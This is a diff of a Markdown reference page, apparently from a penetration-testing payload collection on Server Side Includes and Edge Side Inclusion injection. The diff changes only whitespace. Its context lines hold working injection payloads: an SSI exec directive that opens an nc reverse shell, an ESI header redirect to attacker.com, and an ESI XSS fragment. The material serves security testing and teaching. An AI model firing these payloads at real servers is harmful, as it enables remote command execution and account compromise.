@@ -2,13 +2,11 @@
 
 > Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.
 
-
 ## Summary
 
 * [Methodology](#methodology)
 * [Edge Side Inclusion](#edge-side-inclusion)
 * [References](#references)
-
 
 ## Methodology
 
@@ -26,7 +24,6 @@ SSI format: `<!--#directive param="value" -->`
 | Include a file          | `<!--#include virtual="/index.html" -->` |
 | Execute commands        | `<!--#exec cmd="ls" -->`                 |
 | Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |
-
 
 ## Edge Side Inclusion
 
@@ -48,16 +45,14 @@ Surrogate-Control: content="ESI/1.0"
 | Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
 | Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
 
-
 | Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
 | -------- | -------- | ---- | ------- | ------------------------- | -------------- |
 | Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |
-| Varnish Cache	| Yes | No   | No      | Yes                       | Yes            |
+| Varnish Cache | Yes | No   | No      | Yes                       | Yes            |
 | Fastly   | Yes      | No   | No      | No                        | Yes            |
 | Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No              | No             |
-| NodeJS' esi | Yes	  | Yes  | Yes     | No                        | No             |
+| NodeJS' esi | Yes   | Yes  | Yes     | No                        | No             |
 | NodeJS' nodesi | Yes | No  | No      | No                        | Optional       |
-
 
 ## References
 
